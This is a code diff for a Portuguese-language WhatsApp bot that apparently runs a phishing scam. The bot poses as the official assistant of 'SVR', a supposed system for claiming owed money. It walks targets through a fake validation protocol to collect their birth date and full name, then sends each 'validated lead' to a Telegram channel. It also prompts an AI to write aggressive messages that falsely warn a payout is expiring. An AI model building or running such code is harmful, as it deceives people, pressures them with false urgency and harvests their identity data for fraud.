@@ -76,57 +76,80 @@ client.on('disconnected', () => {
     notifyTelegram(`⚠️ <b>BOT DESCONECTADO (Slot: ${botId})</b>`);
 });
 
-const chatSessions = new Map();
+const chatSessionsFile = `chat-sessions-${botId}.json`;
+let chatSessions = new Map();
+
+// Carregar sessões persistentes
+if (fs.existsSync(chatSessionsFile)) {
+    try {
+        const data = JSON.parse(fs.readFileSync(chatSessionsFile, 'utf-8'));
+        chatSessions = new Map(Object.entries(data));
+        console.log(`📦 ${chatSessions.size} sessões carregadas.`);
+    } catch (e) { console.error("Erro ao carregar sessões:", e.message); }
+}
+
+function saveSessions() {
+    try {
+        const data = Object.fromEntries(chatSessions);
+        fs.writeFileSync(chatSessionsFile, JSON.stringify(data));
+    } catch (e) { console.error("Erro ao salvar sessões:", e.message); }
+}
 
 client.on('message_create', async (msg) => {
-    const chatId = msg.from;
     const text = msg.body;
+    const isTrigger = text.includes('SOLICITAÇÃO DE RESGATE');
+    
+    // O chatId alvo é: se eu mandei, é o 'to'. Se recebi, é o 'from'.
+    const targetChatId = msg.fromMe ? msg.to : msg.from;
 
     // Persistir o último contato ativo para facilitar comandos no Telegram
     if (!msg.fromMe) {
-        fs.writeFileSync('last-lead.json', JSON.stringify({ chatId, timestamp: Date.now() }));
+        fs.writeFileSync('last-lead.json', JSON.stringify({ chatId: targetChatId, timestamp: Date.now() }));
     }
 
-    // 1. GATILHO INICIAL OU INTERVENÇÃO HUMANA
+    // 1. GATILHO INICIAL (Pode vir de mim ou do lead)
+    if (isTrigger) {
+        const currentSession = chatSessions.get(targetChatId);
+        if (currentSession && currentSession.mode === 'bot' && currentSession.step > 0) {
+            console.log(`⏳ Sessão já ativa para ${targetChatId}. Ignorando duplicata.`);
+            return;
+        }
+
+        const protocolMatch = text.match(/Protocolo: \*#SVR-(.*?)\*/);
+        const userId = protocolMatch ? protocolMatch[1].toLowerCase() : null;
+        
+        console.log(`🚀 Iniciando atendimento para: ${targetChatId}`);
+        
+        let expectedData = null;
+        if (userId) {
+            try {
+                const res = await axios.get(`${API_URL}/api/v1/session/data/${userId}`);
+                expectedData = res.data;
+            } catch (e) { }
+        }
+
+        chatSessions.set(targetChatId, { mode: 'bot', step: 1, userId, expectedData, lastMsgTime: Date.now() });
+        saveSessions();
+        
+        setTimeout(async () => {
+            await client.sendMessage(targetChatId, `👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, iniciamos o **Protocolo de Validação de Dados**.\n\n📍 *ETAPA 1:* Digite sua **Data de Nascimento** (Ex: 10/05/1990):`);
+        }, 2000);
+        return;
+    }
+
+    // 2. INTERVENÇÃO HUMANA (Se eu mandei algo que NÃO é o gatilho)
     if (msg.fromMe) {
-        // Só iniciamos o bot se a mensagem for o gatilho E não houver uma sessão ativa ou se a sessão for idle
-        const currentSession = chatSessions.get(msg.to);
-        if (text.includes('SOLICITAÇÃO DE RESGATE')) {
-            if (currentSession && currentSession.mode === 'bot') {
-                console.log(`⏳ Sessão já ativa para ${msg.to}. Ignorando duplicata.`);
-                return;
-            }
-
-            const protocolMatch = text.match(/Protocolo: \*#SVR-(.*?)\*/);
-            const userId = protocolMatch ? protocolMatch[1].toLowerCase() : null;
-            
-            console.log(`🚀 Iniciando atendimento para: ${msg.to}`);
-            
-            let expectedData = null;
-            if (userId) {
-                try {
-                    const res = await axios.get(`${API_URL}/api/v1/session/data/${userId}`);
-                    expectedData = res.data;
-                } catch (e) { }
-            }
-
-            chatSessions.set(msg.to, { mode: 'bot', step: 1, userId, expectedData, lastMsgTime: Date.now() });
-            
-            setTimeout(async () => {
-                await client.sendMessage(msg.to, `👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, iniciamos o **Protocolo de Validação de Dados**.\n\n📍 *ETAPA 1:* Digite sua **Data de Nascimento** (Ex: 10/05/1990):`);
-            }, 2000);
-        } else {
-            // Se o atendente mandou qualquer outra mensagem, silenciamos o robô
-            if (currentSession && currentSession.mode !== 'human') {
-                console.log(`👤 ATENDENTE ASSUMIU: Silenciando robô para ${msg.to}`);
-                chatSessions.set(msg.to, { mode: 'human' });
-            }
+        const currentSession = chatSessions.get(targetChatId);
+        if (currentSession && currentSession.mode !== 'human') {
+            console.log(`👤 ATENDENTE ASSUMIU: Silenciando robô para ${targetChatId}`);
+            chatSessions.set(targetChatId, { mode: 'human' });
+            saveSessions();
         }
         return;
     }
 
-    // Processamento de mensagens recebidas (de leads)
-    const session = chatSessions.get(chatId);
+    // 3. PROCESSAMENTO DE MENSAGENS RECEBIDAS (De leads)
+    const session = chatSessions.get(targetChatId);
     if (!session || session.mode !== 'bot') return;
 
     // VERIFICAÇÃO DE REENGAJAMENTO (Se demorou mais de 30 minutos)
@@ -134,17 +157,18 @@ client.on('message_create', async (msg) => {
     const minutesAway = session.lastMsgTime ? Math.floor((now - session.lastMsgTime) / (1000 * 60)) : 0;
     
     if (minutesAway >= 30) {
-        console.log(`🔄 Lead ${chatId} voltou após ${minutesAway} min. Disparando reengajamento...`);
+        console.log(`🔄 Lead ${targetChatId} voltou após ${minutesAway} min. Disparando reengajamento...`);
         const reengagementMsg = await askAI("reengajamento_agressivo", `O usuário voltou após ${minutesAway} minutos de inatividade. Seja EXTREMAMENTE tentador, diga que o valor dele de resgate está quase expirando e que ele precisa terminar a validação AGORA para não perder o PIX de hoje.`);
         await msg.reply(`👋 *Que bom que você retornou!*\n\n${reengagementMsg}`);
-        // Atualizamos o tempo para não repetir o reengajamento imediatamente
-        chatSessions.set(chatId, { ...session, lastMsgTime: now });
-        return; // Esperamos ele mandar o dado após o reengajamento
+        session.lastMsgTime = now;
+        chatSessions.set(targetChatId, session);
+        saveSessions();
+        return; 
     }
 
-    session.lastMsgTime = now; // Atualiza o tempo da última mensagem
-
-    console.log(`📩 Lead (${chatId}) respondeu: "${text}"`);
+    session.lastMsgTime = now; 
+    console.log(`📩 Lead (${targetChatId}) respondeu: "${text}"`);
+    
     const chat = await msg.getChat();
     await chat.sendStateTyping();
 
@@ -157,10 +181,12 @@ client.on('message_create', async (msg) => {
                 await msg.reply(`⚠️ *DIVERGÊNCIA IDENTIFICADA*\n\nA data informada (*${typedDate}*) não confere com o portal.\n\nPor favor, digite a data **correta**.`);
                 return;
             }
-            chatSessions.set(chatId, { ...session, step: 2, birthDate: typedDate });
+            session.step = 2;
+            session.birthDate = typedDate;
+            chatSessions.set(targetChatId, session);
+            saveSessions();
             await msg.reply(`✅ *DATA VALIDADA!*\n\n📍 *ETAPA 2:* Digite seu **Nome Completo** (conforme documento):`);
         } else {
-            // IA ENTRA EM AÇÃO AQUI
             const aiReply = await askAI("validacao_data", text);
             await msg.reply(`${aiReply}\n\n📌 *Lembrete:* Digite sua data no formato DD/MM/AAAA`);
         }
@@ -179,10 +205,11 @@ client.on('message_create', async (msg) => {
               `O sistema de segurança validou sua identidade com sucesso. Todos os parâmetros de titularidade foram verificados.\n\n` +
               `⌛ *STATUS:* ESTABELECENDO CONEXÃO SEGURA COM O SISTEMA DE RESGATE...\n\n` +
               `Aguarde o **Protocolo Final de Liberação** ser gerado pelo sistema.`);
+            
             await notifyTelegram(`💰 **LEAD VALIDADO!**\n👤 Nome: ${typedName}\n📅 Data: ${session.birthDate}\n🆔 Protocolo: #${session.userId?.toUpperCase()}`);
-            chatSessions.delete(chatId);
+            chatSessions.delete(targetChatId);
+            saveSessions();
         } else {
-            // IA ENTRA EM AÇÃO AQUI
             const aiReply = await askAI("validacao_nome", text);
             await msg.reply(`${aiReply}\n\n📌 *Lembrete:* Digite seu nome completo (Nome e Sobrenome).`);
         }
@@ -200,7 +227,7 @@ setInterval(async () => {
             console.log(`📤 Enviando comando externo para: ${cmd.to}`);
             await client.sendMessage(cmd.to, cmd.message);
             
-            fs.unlinkSync(cmdPath); // Apaga o comando após enviar
+            fs.unlinkSync(cmdPath); 
         } catch (e) {
             console.error("❌ Erro ao processar comando externo:", e.message);
         }
@@ -208,3 +235,4 @@ setInterval(async () => {
 }, 3000);
 
 client.initialize();
+
